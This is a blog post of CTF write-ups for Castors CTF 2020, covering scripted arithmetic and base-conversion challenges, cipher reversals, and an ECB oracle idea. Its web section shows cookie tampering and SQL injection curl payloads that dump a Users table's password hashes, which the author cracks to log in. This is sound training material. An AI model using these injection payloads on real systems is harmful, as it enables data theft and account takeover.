---
title: Writeups for Castors CTF 2020
category: cyber-security
tags: [ctf]
---

This is the full collection of writeups for the challenges I solved during Castors CTF.

# Coding

## Arithmetics

![arithmetics](/assets/images/arithmetics.png)

Once you connected to the shell, you were quizzed with different arithmetic questions (see below) that you had to solve quickly. Some of the questions replaced numbers and operators with their spelled-out form and you needed to take this factor into account.

```bash

------------------Welcome to Beginner Arithmetics!------------------
To get the flag you'll have to solve a series of arithmetic challenges.
The problems may be addition, substraction, multiplication or integer division.
Numbers can range from 1 to 9. Easy right?
You'll have very little time to answer so do your best!
Hit <enter> when ready.

What is 5 - 6 ?
```

To solve this, we just needed to write a simple script that would solve the operations using `pwntools`:

```python
from pwn import *

r = remote("chals20.cybercastors.com", 14429)

# skip description
r.recvuntil("ready.")
r.recvline()
r.sendline()

nums = {'one':'1',
    'two':'2',
    'three':'3',
    'four':'4',
    'five':'5',
    'six':'6',
    'seven':'7',
    'eight':'8',
    'nine':'9'}

multipliers = {
    'minus': '-',
    'plus': '+',
    'multiplied-by': '*',
    'divided-by': '//'
}

for i in range(100):
    r.recvuntil("is ")
    # sanitize operation to get only essentials
    query = str(r.recvuntil("?")[:-2]).replace("b'", '').replace("'", '').split(" ")
    
    # dirty-but-it-works-method of replacing spelled-out numbers with real ones.
    if query[0] in nums:
        query[0] = nums[query[0]]
    if query[-1] in nums:
        query[-1] = nums[query[-1]]
    if query[1] in multipliers:
        query[1] = multipliers[query[1]]
    # eval expression and send back
    r.sendline(str(eval(" ".join(query))))

r.interactive()
```

Flag: `castorsCTF(n00b_pyth0n_4r17hm3t1c5}`

## Glitchity Glitch

![glitchity](/assets/images/glitchity.png)

Once you connected to this network, you had the following prompt:

```bash
Welcome to my store, hope your bartering skill is high enough.
Here's the lot of them	 Your money: 100
Your money: 100
	0. Sell Item
	1. USB - 5 coins
	2. Book - 10 coins
	3. Snowglobe - 7 coins
	4. Painting - 100 coins
	5. Flag - 5000 coins
	6. VPN - 20 coins
	7. Quit
Choice:
```

So we need to get enough coins by bartering so we can buy the flag. I noticed that when you sold the VPN you got the money but didn't actually lose the item. So we need to sell it many times to get enough money for the flag.

This was the script to repeatedly sell the VPN:

```python
#castors ctf 2020
from pwn import *

r = remote("chals20.cybercastors.com", 14432)
r.clean()
r.sendline("6")
print(r.clean())
for x in range(251):
    print(x)
    r.sendline("0")
    print(r.recvline())
    r.clean()
    r.sendline("1")
    print(r.recvline())
    r.clean()

r.sendline("5")
r.interactive()
```

Flag: `castorsCTF{$imPl3_sTUph_3h?}`

## Flag Gods

![flag-gods](/assets/images/flag-gods.png)

Initial prompt:

``` bash

 ______ __      ______  ______       ______  ______  _____   ______    
/\  ___/\ \    /\  __ \/\  ___\     /\  ___\/\  __ \/\  __-./\  ___\   
\ \  __\ \ \___\ \  __ \ \ \__ \    \ \ \__ \ \ \/\ \ \ \/\ \ \___  \  
 \ \_\  \ \_____\ \_\ \_\ \_____\    \ \_____\ \_____\ \____-\/\_____\ 
  \/_/   \/_____/\/_/\/_/\/_____/     \/_____/\/_____/\/____/ \/_____/ 
                                                                                                                                                             

We have a small problem...
The flag gods are trying to send us a message, but our transmitter isn't calibrated to
decode it! If you can find the hamming distance for the following messages we may be
able to calibrate the transmitter in time. Entering the wrong distance will lock the
machine. Good luck, we'll only have 20 seconds!
Hit <enter> when ready.

The machine is currently 20% calibrated.
Transmitted message: A clueless girl hits a puppy dutifully.
Received message: 3ed31c1102baba8e8d8cdd9c961dfb9795968a9ecf9cd78b8eeb8786db9a8a0f0e888e518286d1
Enter hamming distance: 

```

The [Hamming Distance](https://en.wikipedia.org/wiki/Hamming_distance) is the number of letters we need to change in two equal length strings so they become the same.

So what you needed to do here was to repeatedly transform the transmitted message to hex and calculate the hamming distance between the two strings until we get the flag.

Script:

```python
from hexhamming import hamming_distance
from pwn import *

r = remote("chals20.cybercastors.com", 14431)
r.sendline()
# skip desc
for x in range(14):
    r.recvline()

for x in range(80):
    # break when problems are done
    try:
        r.recvline()
        transmitted = str(r.recvline()).split(":")[1][1:-3]
        received = str(r.recvline()).split(":")[1][1:-3]
        hex = transmitted.encode('utf-8').hex()
        r.sendline(str(hamming_distance(hex, received)))
        r.recvline()
    except:
        break
# print flag
print(r.recv(1024))
```



Flag: `castorsCTF{c0mmun1ng_w17h_7h3_f14g_g0d5}`

## Base Runner

![base runner](/assets/images/base-runner.png)

Initial prompt:

```
 ______  ______  ______  ______       ______  __  __  __   __  __   __  ______  ______    
/\  == \/\  __ \/\  ___\/\  ___\     /\  == \/\ \/\ \/\ "-.\ \/\ "-.\ \/\  ___\/\  == \   
\ \  __<\ \  __ \ \___  \ \  __\     \ \  __<\ \ \_\ \ \ \-.  \ \ \-.  \ \  __\\ \  __<   
 \ \_____\ \_\ \_\/\_____\ \_____\    \ \_\ \_\ \_____\ \_\\ \_\ \_\\ \_\ \_____\ \_\ \_\ 
  \/_____/\/_/\/_/\/_____/\/_____/     \/_/ /_/\/_____/\/_/ \/_/\/_/ \/_/\/_____/\/_/ /_/ 
                                                                                          

Listen up!
We're down 0 - 49 with 2 outs on the final inning but we got this!
Don't worry about getting hits, just run those bases as fast as you can.
They have The Flash fielding for their team!
Hit <enter> when ready.
```

This is followed by a long string of binary.

So to solve this one we noticed that we had to repeatedly convert the binary (see script) through many different bases (hence the title) and then output the result, which was always in `castorsCTF{}` format. Once you do it enough times, you get the flag.

Initial script:

```python
import base64
from pwn import *

def convert_base(num_list, base):
    converted = ""
    for num in num_list:
        converted += chr(int(num, base))

    return converted.split(" ")

def parse_binary(bin):
    # conversion
    base_2 = convert_base(bin, 2)
    base_8 = convert_base(base_2, 8)
    base_16 = convert_base(base_8, 16)
    return base64.b64decode(''.join(base_16))

p = remote('chals20.cybercastors.com', 14430)
p.sendline()
p.recvuntil("ready.\n")
received = p.recvuntil("\n")

# parse first message
received = received.split(b"\n")[0].split(b" ")
p.sendline(parse_binary(received))

for x in range(200):
    # continue until all questions are solved
    try:
        p.recvline()
        received = p.recvuntil("\n")
        received = received.split(b"\n")[0].split(b" ")
        p.sendline(parse_binary(received))
    except:
        break

# view flag
p.interactive()
```

Flag: `castorsCTF{m4j0r_l34gu3_py7h0n_b4s3_runn3r}`

# Cryptography

## 0X101 Dalmatians

![dalmatians](/assets/images/dalmatians.png)

Based on the previous challenge, we knew the numbers were being encrypted with the first 41 prime numbers. The idea of `Response to Amazon` in the challenge description suggest this challenge was similar, but maybe with an extra touch of complexity.

I converted the numbers from hex to decimal and got this: `output = [198, 34, 61, 41, 193, 197, 156, 245, 133, 231, 215, 14, 70, 230, 33, 231, 221, 141, 219, 67, 160, 52, 119, 4, 127, 50, 19, 140, 201, 1, 101, 120, 95, 192, 20, 142, 51, 191, 188, 2, 33, 121, 225, 93, 211, 70, 224, 202, 238, 114, 194, 38, 56]`.

We had one piece of the puzzle, reversing the prime encryption, but something else was missing. After many attempts and inquiries, we guessed that the numbers were being encrypted with the following formula:

```python
for p, index in plaintext: p * prime_series(index) % 0x101 (257 in decimal)
```

We banged our heads in frustration for a while trying to decrypt like this:

```python
for e, index in encrypted: modinv(e / prime_series(index))
```

PS: `modinv(n, modulo)` is equivalent to `pow(n, -1, modulo)` in python.

Unfortunately, this isn't the way to reverse what I learned is the [multiplicative cipher](http://pi.math.cornell.edu/~mec/Summer2008/lundell/lecture3.html). This Cornell text explains that to decrypt an encrypted text of form: `C = c * p mod n`, we must use the formula `modinv(p, n) * C % n` to find the decrypted numbers. 

From there, all we had to do was convert these numbers to text from aasci and voila!

Script (**only for >= 3.8**):

```python
output = [198, 34, 61, 41, 193, 197, 156, 245, 133, 231, 215, 14, 70, 230, 33, 231, 221, 141, 219, 67, 160, 52, 119, 4, 127, 50, 19, 140, 201, 1, 101, 120, 95, 192, 20, 142, 51, 191, 188, 2, 33, 121, 225, 93, 211, 70, 224, 202, 238, 114, 194, 38, 56]

# first 53 primes
primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97,	101, 	103, 	107, 	109,
113, 	127, 	131, 	137, 	139, 	149, 	151, 	157, 	163, 	167,
173, 	179, 	181, 	191, 	193, 	197, 	199, 	211, 	223, 	227,
229, 	233, 	239, 	241]

print(len(output))
i = 0
for x in output:
  print(chr(pow(primes[i], -1, 257) * x % 257), end='')
  i += 1
```

Script (**any python version**):

```python
def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('modular inverse does not exist')
    else:
        return x % m
  
output = [198, 34, 61, 41, 193, 197, 156, 245, 133, 231, 215, 14, 70, 230, 33, 231, 221, 141, 219, 67, 160, 52, 119, 4, 127, 50, 19, 140, 201, 1, 101, 120, 95, 192, 20, 142, 51, 191, 188, 2, 33, 121, 225, 93, 211, 70, 224, 202, 238, 114, 194, 38, 56]

# first 53 primes
primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97,	101, 	103, 	107, 	109,
113, 	127, 	131, 	137, 	139, 	149, 	151, 	157, 	163, 	167,
173, 	179, 	181, 	191, 	193, 	197, 	199, 	211, 	223, 	227,
229, 	233, 	239, 	241]

print(len(output))
i = 0
for x in output:
  print(chr(modinv(primes[i], 257) * x % 257), end='')
  i += 1
```



Flag: `castorsCTF{1f_y0u_g07_th1s_w1th0u7_4ny_h1n7s_r3sp3c7}`

## Bagel Bytes

Now this was probably my favorite challenge. You had to abuse the padding in the `AES-EBC` to find the flag bit-by-bit.

![bagel bytes](/assets/images/bagel-bytes.png)

^ The server code was added after I solved it but it was not necessary. 

Initial Prompt:

```
 ______  ______  ______  ______  __           ______  __  __  ______ ______  ______    
/\  == \/\  __ \/\  ___\/\  ___\/\ \         /\  == \/\ \_\ \/\__  _/\  ___\/\  ___\   
\ \  __<\ \  __ \ \ \__ \ \  __\\ \ \____    \ \  __<\ \____ \/_/\ \\ \  __\\ \___  \  
 \ \_____\ \_\ \_\ \_____\ \_____\ \_____\    \ \_____\/\_____\ \ \_\\ \_____\/\_____\ 
  \/_____/\/_/\/_/\/_____/\/_____/\/_____/     \/_____/\/_____/  \/_/ \/_____/\/_____/ 
                                                                                       
Welcome to Bagel Bytes!
Our ovens are known for baking ExtraCrispyBagels!
We bake 16 bagels per rack and the last rack is always full!
Today's special is flag bagels!

Select:
    1) Bake your own bagels!
    2) Bake the flag!
Your choice: 
```

The `16 bagels per rack` here indicates that the text is padded for 16 byte blocks and we can use this to abuse the encryption.

So when you select `bake the flag`, you enter an input and then a long hash of which the size is a multiple of 16 is spitted out. This allows us to presume that the flag is being concatenated with then input and then hashed into 16-bit blocks.

What this means is that if for example we send a 15-bit string (`aaaaaaaaaaaaaaa`), it will be padded with the first bit of the flag and then encrypted as a `16 bit` block, so like this: `cipher(input + flag[0])`. So the beginning of the hash will be made of this block.

So then we can try inputting `aaaaaaaaaaaaaaa` + every printable character, and if it is ever equal to the initial block we got with the padding of the first bit of the flag, then we know that that character is the first character of the flag.

To find the second, we do the same routine except we send a 14-bit string and this time instead of comparing our cipher block to `15-bit string + printable character ` we compare it to `14-bit string + portion of flag we have + printable character`.

So on and so forth until we get the flag, bit by bit.

Flag: `castorsCTF{I_L1k3_muh_b4G3l5_3x7r4_cr15pY}`
**SCRIPT TOMORROW**

## Reversing

## Vault1

The description of this challenge was empty, all we had was the challenge file:

```python
import base64
def xor(s1,s2):
    return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))

def checkpass():
    _input = input("Enter the password: ")
    key = "promortyusvatofacidpromortyusvato"
    encoded = str.encode(xor(key, _input))
    result = base64.b64encode(encoded, altchars=None)
    if result == b'ExMcGQAABzohNQ0TRQwtPidYAS8gXg4kAkcYISwOUQYS':
        return True
    else:
        return False

def main():
    global access
    access = checkpass()
    if access:
        print("Yeah...okay. You got it!")
    else:
        print("Lol...try again...")

access = False
main()
```

So what we had to do here was to decode that base64 `ExMcGQAABzohNQ0TRQwtPidYAS8gXg4kAkcYISwOUQYS` and then xor it with the key.

Flag: `castorsCTF{r1cK_D1e_R1cKp3aT_x0r}`

# Web

## Car Lottery

All this challenge had was a url, http://web1.cybercastors.com:14435.

When you landed on the web page, you would see this text:

```
Welcome!!

Here you get to test your luck for a chance to win a car!!

To win the car you must be the 3123213rd visitor, to try your luck just refresh your browser!
```

My teammate Aadi told me it set a client cookie to some number, in his case, `103`. When I reloaded, it sad that was the `100 - 35 = 68`th visitor. This meant it was setting the visitor by substracting 35 from that cookie. So he set the cookie to  `3123213 + 35 = 3123248`.

I was greeted with this:

![car lotto](/assets/images/car-lotto.gif)

So I noticed that it seemed it was querying a db with that `id` parameter so I attempted sql injection.

I tried this payload in curl to see if I could get all the cars with sqli:

```bash
curl --data "id=1 OR 1=1;--" --cookie "client=3123248" http://web1.cybercastors.com:14435/search
```

Indeed, I got all the car data:

```html
<tr>
    <th>Type</th>
    <th>Make</th>
    <th>Model</th>
    <th>Year</th>
  </tr>
  
  <tr>
    <td style="text-align:center">Sport</td>
    <td style="text-align:center">Audi</td>
    <td style="text-align:center">R8</td>
    <td style="text-align:center">2020</td>
  </tr>
  
  <tr>
    <td style="text-align:center">Sport</td>
    <td style="text-align:center">Ferrari</td>
    <td style="text-align:center">Portofino</td>
    <td style="text-align:center">2018</td>
  </tr>
  
  <tr>
    <td style="text-align:center">Sedan</td>
    <td style="text-align:center">Hyundai</td>
    <td style="text-align:center">Genesis</td>
    <td style="text-align:center">2019</td>
  </tr>
  
  <tr>
    <td style="text-align:center">Sedan</td>
    <td style="text-align:center">Ford</td>
    <td style="text-align:center">Focus</td>
    <td style="text-align:center">2015</td>
  </tr>
  
  <tr>
    <td style="text-align:center">Sport</td>
    <td style="text-align:center">Lamborghini</td>
    <td style="text-align:center">Aventador</td>
    <td style="text-align:center">2016</td>
  </tr>
  
  <tr>
    <td style="text-align:center">Minivan</td>
    <td style="text-align:center">Honda</td>
    <td style="text-align:center">Odyssey</td>
    <td style="text-align:center">2020</td>
  </tr>
  
  <tr>
    <td style="text-align:center">Sport</td>
    <td style="text-align:center">Bugatti</td>
    <td style="text-align:center">Chiron</td>
    <td style="text-align:center">2019</td>
  </tr>
  
  <tr>
    <td style="text-align:center">Sedan</td>
    <td style="text-align:center">Honda</td>
    <td style="text-align:center">Accord</td>
    <td style="text-align:center">2020</td>
  </tr>
  
  <tr>
    <td style="text-align:center">Sedan</td>
    <td style="text-align:center">Honda</td>
    <td style="text-align:center">Civic Si</td>
    <td style="text-align:center">2016</td>
  </tr>
  
  <tr>
    <td style="text-align:center">Sedan</td>
    <td style="text-align:center">Toyota</td>
    <td style="text-align:center">Yaris</td>
    <td style="text-align:center">2020</td>
  </tr>
  
...
```

I wanted to see the different tables of the db, so I tried a union select that would provide me with that information:

I used this `UNION SELECT` to get all tables (padded with 0s for equal number of columns):

```bash
curl --data "id=1 UNION SELECT 0, 0, 0, 0, table_name from information_schema.tables;--" --cookie "client=3123248" http://web1.cybercastors.com:14435/search
```

I found one interesting one called `Users` and queried that:

```bash
curl --data "id=1 UNION SELECT 0, 0, 0, password, username from Users;--" --cookie "client=3123248" http://web1.cybercastors.com:14435/search
```

```html
  <tr>
    <td style="text-align:center">0</td>
    <td style="text-align:center">cf9ee5bcb36b4936dd7064ee9b2f139e</td>
    <td style="text-align:center">0</td>
    <td style="text-align:center">admin@cybercastors.com</td>
  </tr>
  
  <tr>
    <td style="text-align:center">0</td>
    <td style="text-align:center">fe87c92e83ff6523d677b7fd36c3252d</td>
    <td style="text-align:center">0</td>
    <td style="text-align:center">admin@powerpuffgirls.com</td>
  </tr>
  
  <tr>
    <td style="text-align:center">0</td>
    <td style="text-align:center">d1833805515fc34b46c2b9de553f599d</td>
    <td style="text-align:center">0</td>
    <td style="text-align:center">jeff@homeaddress.com</td>
  </tr>
  
  <tr>
    <td style="text-align:center">0</td>
    <td style="text-align:center">77004ea213d5fc71acf74a8c9c6795fb</td>
    <td style="text-align:center">0</td>
    <td style="text-align:center">moreusers@leakingdata.com</td>
  </tr>
```

We cracked these hashes and found that the password for the first account was `naruto`.

We had run `gobuster` earlier and found a login page at `/dealer`. So I just had to login with that email and `naruto` to solve it:

![sol](/assets/images/car-sol.gif)
